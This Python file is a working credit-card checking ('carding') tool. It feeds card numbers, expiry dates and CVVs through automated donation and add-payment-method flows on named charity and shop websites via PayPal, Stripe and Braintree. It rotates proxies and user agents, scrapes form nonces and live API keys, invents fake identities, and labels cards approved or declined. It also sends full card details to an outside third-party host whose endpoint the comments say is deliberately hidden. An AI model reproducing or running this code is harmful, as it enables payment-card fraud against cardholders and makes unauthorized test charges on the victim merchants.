#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import random
import base64
import time
import urllib3
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Helper: Format proxy for requests
# ============================================================================
def format_proxy(proxy):
    if not proxy:
        return None
    parts = proxy.split(':')
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    elif len(parts) == 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    return None

# ============================================================================
# Simple random user‑agent generator
# ============================================================================
def generate_user_agent():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(ua_list)

# ============================================================================
# Global constants for compatibility
# ============================================================================
PAYPAL_SITE = "http://bavashdesigns.com"
PAYPAL_AMOUNT = 0.05

# ============================================================================
# WORKING PAYPAL GATE (2africa.org)
# ============================================================================
def check_paypal_working(cc, proxy=None):
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy

        SITE_URL = 'https://2africa.org/donate-now/'
        BASE_URL = 'https://2africa.org'
        UA = generate_user_agent()

        def extract_data():
            s = requests.Session()
            s.verify = False
            if proxy:
                s.proxies.update(format_proxy(proxy))
            headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            r = s.get(SITE_URL, headers=headers, timeout=30)
            html = r.text
            if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                fid = re.search(r'form-id[=]+(\d+)', html)
                if fid:
                    iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                    r2 = s.get(iframe, headers=headers, timeout=30)
                    html = r2.text

            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            if not fp:
                fp = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
            if not fi:
                fi = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not nc:
                nc = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not all([fp, fi, nc]):
                return None

            enc = re.search(r'"data-client-token":"(.*?)"', html)
            if not enc:
                enc = re.search(r'data-client-token="([^"]+)"', html)
            if not enc:
                return None
            dec = base64.b64decode(enc.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec)
            if not au:
                return None
            return {
                'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
                'at': au.group(1), 'session': s
            }

        d = extract_data()
        if not d:
            return "Failed to extract form data", "ERROR"

        s = d['session']
        fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']

        email = f'drgam{random.randint(100,999)}@gmail.com'
        first_name = 'DRGAM'
        last_name = 'rights and'

        # Step 1: initial donation setup
        headers = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': '', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': '3', 'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00', 'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce', 'give_first': first_name,
            'give_last': last_name, 'give_email': email,
            'card_name': 'drgam', 'card_exp_month': '', 'card_exp_year': '',
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        # Step 2: create order
        mp = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
                    headers=headers, data=mp, timeout=30)
        try:
            tok = r1.json()['data']['id']
        except:
            return f"Order creation failed: {r1.text[:150]}", "ERROR"

        # Step 3: confirm payment source with PayPal
        pp_headers = {
            'authority': 'cors.api.paypal.com', 'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {at}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site', 'user-agent': UA,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': cc_num,
                    'expiry': f'{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False},
        }
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
               headers=pp_headers, json=json_data, timeout=30)

        # Step 4: approve order
        mp2 = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp2.content_type
        r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok,
                    headers=headers, data=mp2, timeout=30)
        txt = r2.text

        if 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return "Charged $1.00", "APPROVED"
        decline_keywords = [
            'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
            'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER', 'ORDER_NOT_APPROVED', 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY', 'INSUFFICIENT_FUNDS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED', 'PAYMENT_DENIED', 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CARD', 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT'
        ]
        for kw in decline_keywords:
            if kw in txt:
                return f"Declined: {kw}", "DECLINED"
        return f"Unknown response: {txt[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

check_paypal_fixed = check_paypal_working
check_paypal_general = check_paypal_working

# ============================================================================
# LOCAL STRIPE GATE (bambifoundation.org)
# ============================================================================
def check_stripe_api(cc, proxy=None):
    """
    Stripe gate using bambifoundation.org.
    Returns (message, status).
    """
    try:
        cc = cc.strip()
        parts = re.split(r'[ |/]', cc)
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        c = parts[0]
        mm = parts[1]
        ex = parts[2]
        cvc = parts[3]

        # Normalize year
        if len(ex) == 2:
            yy = ex
        elif len(ex) == 4:
            yy = ex[2:]
        else:
            yy = ex
        if len(yy) == 4:
            yy = yy[2:]

        user_agent = generate_user_agent()
        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))
        session.verify = False

        # 1. Get form data
        headers = {'user-agent': user_agent}
        resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
        html = resp.text

        # Extract required fields
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)

        # 2. Initial donation setup (POST to admin-ajax)
        headers = {
            'origin': 'https://bambifoundation.org',
            'referer': 'https://bambifoundation.org/donate-now/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Give a Donation',
            'give-current-url': 'https://bambifoundation.org/donate-now/',
            'give-form-url': 'https://bambifoundation.org/donate-now/',
            'give-form-minimum': '10.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '10.00',
            'give_tributes_type': 'DrGaM Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In Honor Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': '',
            'payment-mode': 'stripe',
            'give_first': 'drgam',
            'give_last': 'drgam',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        session.post('https://bambifoundation.org/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        # 3. Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, timeout=30)
        payment_method_id = resp.json()['id']

        # 4. Complete donation with Stripe payment method
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bambifoundation.org',
            'referer': 'https://bambifoundation.org/donate-now/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        params = {'payment-mode': 'stripe', 'form-id': form_id}
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Give a Donation',
            'give-current-url': 'https://bambifoundation.org/donate-now/',
            'give-form-url': 'https://bambifoundation.org/donate-now/',
            'give-form-minimum': '10.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '10.00',
            'give_tributes_type': 'In Honor Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'Drgam Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': payment_method_id,
            'payment-mode': 'stripe',
            'give_first': 'drgam',
            'give_last': 'drgam',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30, allow_redirects=True)
        text = resp.text

        # Parse response
        if 'Thank you' in text or 'succeeded' in text:
            return "Charged $10.00", "APPROVED"
        if 'Your card was declined.' in text:
            return "Card declined", "DECLINED"
        if 'Your card has insufficient funds.' in text:
            return "Insufficient funds", "DECLINED"
        if 'Your card number is incorrect.' in text:
            return "Invalid card number", "DECLINED"
        if 'expired' in text.lower():
            return "Expired card", "DECLINED"
        error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
        if error_match:
            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            return f"Error: {error_msg}", "DECLINED"
        if 'error' in text.lower():
            return "Unknown error (see details)", "DECLINED"
        return f"Unknown response: {text[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# LOCAL BRAINTREE GATE (shop.trifectanutrition.com)
# ============================================================================
def check_braintree(cc, proxy=None):
    """
    Braintree tokenization gate using shop.trifectanutrition.com.
    Returns (message, status).
    """
    try:
        cc = cc.strip()
        parts = re.split(r'[ |/]', cc)
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        c = parts[0]
        mm = parts[1]
        ex = parts[2]
        cvc = parts[3]
        if len(ex) == 2:
            yy = ex
        elif len(ex) == 4:
            yy = ex[2:]
        else:
            yy = ex
        if len(yy) == 4:
            yy = yy[2:]
        if len(yy) != 2:
            yy = yy[-2:]

        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        email = f"{username}@gmail.com"
        user_agent = generate_user_agent()

        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))
        session.verify = False

        # 1. Create account
        headers = {'User-Agent': user_agent}
        json_data = {'email': email, 'password': email}
        session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
                     headers=headers, json=json_data, timeout=30)

        # 2. Get address nonce – using multiple patterns
        resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                           headers=headers, timeout=30)
        html = resp.text
        address_nonce = None
        patterns = [
            r'name="woocommerce-edit-address-nonce" value="(.*?)"',
            r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
            r'woocommerce-edit-address-nonce" value="([^"]+)"',
        ]
        for pat in patterns:
            match = re.search(pat, html)
            if match:
                address_nonce = match.group(1)
                break
        if not address_nonce:
            return "Failed to get address nonce", "ERROR"

        # 3. Set billing address
        data = {
            'billing_first_name': 'Hussein',
            'billing_last_name': 'Alfuraijii',
            'billing_company': '',
            'billing_country': 'CA',
            'billing_address_1': '3480 Granada Ave',
            'billing_city': 'Los Angeles',
            'billing_state': 'AB',
            'billing_postcode': 'T7S 1E8',
            'billing_phone': '3153153152',
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }
        session.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                     headers=headers, data=data, timeout=30)

        # 4. Get payment page nonces
        resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                           headers=headers, timeout=30)
        html = resp.text
        payment_nonce = None
        for pat in patterns:
            match = re.search(pat.replace('edit-address', 'add-payment-method'), html)
            if match:
                payment_nonce = match.group(1)
                break
        if not payment_nonce:
            match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', html)
            if match:
                payment_nonce = match.group(1)
        if not payment_nonce:
            return "Failed to get payment nonce", "ERROR"

        client_token_nonce = None
        match = re.search(r'client_token_nonce":"([^"]+)"', html)
        if match:
            client_token_nonce = match.group(1)
        if not client_token_nonce:
            match = re.search(r'client_token_nonce["\']:\s*["\']([^"\']+)["\']', html)
            if match:
                client_token_nonce = match.group(1)
        if not client_token_nonce:
            return "Failed to get client token nonce", "ERROR"

        # 5. Get Braintree client token
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
        resp = session.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
                            headers=headers, data=data, timeout=30)
        enc = resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

        # 6. Tokenize card
        braintree_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user_agent,
        }
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': c,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        resp = session.post('https://payments.braintree-api.com/graphql',
                            headers=braintree_headers, json=json_data, timeout=30)
        token = resp.json()['data']['tokenizeCreditCard']['token']

        # 7. Add payment method
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = session.post('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                            headers=headers, data=data, timeout=30)
        text = resp.text

        if 'added' in text or 'Payment method successfully added.' in text:
            return "Approved ✅", "APPROVED"
        elif 'Duplicate card exists' in text:
            return "Approved ✅ (Duplicate)", "APPROVED"
        elif 'risk_threshold' in text:
            return "RISK: Retry this BIN later.", "DECLINED"
        elif 'Card Issuer Declined CVV' in text:
            return "Declined CVV", "DECLINED"
        elif 'avs' in text or 'cvv' in text:
            return "AVS/CVV Failure", "DECLINED"
        else:
            match = re.search(r'Reason: (.+?)\s*</li>', text)
            if match:
                reason = match.group(1)
                return f"Declined: {reason}", "DECLINED"
            return "Unknown error", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# GENERIC GATEWAY API (all gates share the same base URL and key)
# No "Onyx" naming, errors hide the endpoint, timeout = 120 seconds
# ============================================================================
GATEWAY_API_BASE = "https://onyxenvbot.up.railway.app"
API_KEY = "yashikaaa"

def _check_gateway_api(cc, gateway_path, gateway_name):
    """
    Internal helper for all API-based gates.
    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_encoded = cc  # the API expects the whole cc string with '|' separators
        # URL-encode the whole CC string to avoid issues with '|'
        import urllib.parse
        cc_encoded = urllib.parse.quote(cc_encoded)
        url = f"{GATEWAY_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"

        session = requests.Session()
        # No proxy support in this helper because the external API is not meant to be proxied
        response = session.get(url, timeout=120, verify=False)
        response.raise_for_status()
        data = response.json()

        result_status = data.get('status', '').lower()
        response_msg = data.get('response', '')

        if result_status == 'approved':
            return response_msg, "APPROVED"
        else:
            # Return the decline reason but without any URL or internal details
            return response_msg if response_msg else "Declined", "DECLINED"

    except requests.exceptions.Timeout:
        return "Gateway timeout", "ERROR"
    except requests.exceptions.RequestException:
        # Generic error – no URL or details exposed
        return "Gateway error", "ERROR"
    except json.JSONDecodeError:
        return "Invalid response", "ERROR"
    except Exception:
        return "Gateway error", "ERROR"

# ============================================================================
# API-BASED GATES (replacing the old dummy functions)
# ============================================================================
def check_chaos(cc, proxy=None):
    return _check_gateway_api(cc, "chaos", "Chaos Auth")

def check_adyen(cc, proxy=None):
    return _check_gateway_api(cc, "adyen", "Adyen Auth")

def check_app_auth(cc, proxy=None):
    return _check_gateway_api(cc, "app-auth", "App Based Auth")

def check_payflow(cc, proxy=None):
    return _check_gateway_api(cc, "payflow", "Payflow")

def check_random(cc, proxy=None):
    return _check_gateway_api(cc, "random", "Random Auth")

def check_shopify_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "shopify", "Shopify")

def check_skrill(cc, proxy=None):
    return _check_gateway_api(cc, "skrill", "Skrill")

def check_stripe_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "stripe", "Stripe")

def check_arcenus(cc, proxy=None):
    return _check_gateway_api(cc, "arcenus", "Arcenus")

def check_random_stripe(cc, proxy=None):
    return _check_gateway_api(cc, "random-stripe", "Random Stripe")

def check_razorpay(cc, proxy=None):
    return _check_gateway_api(cc, "razorpay", "RazorPay")

def check_payu(cc, proxy=None):
    return _check_gateway_api(cc, "payu", "PayU")

def check_sk_gateway(cc, proxy=None):
    return _check_gateway_api(cc, "sk", "SK Gateway")

def check_paypal_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "paypal", "PayPal")

# ============================================================================
# Additional API gate for Braintree (local version already exists as check_braintree)
# This is provided for completeness, but the local version is kept unchanged.
# ============================================================================
def check_braintree_api(cc, proxy=None):
    return _check_gateway_api(cc, "braintree", "Braintree API")
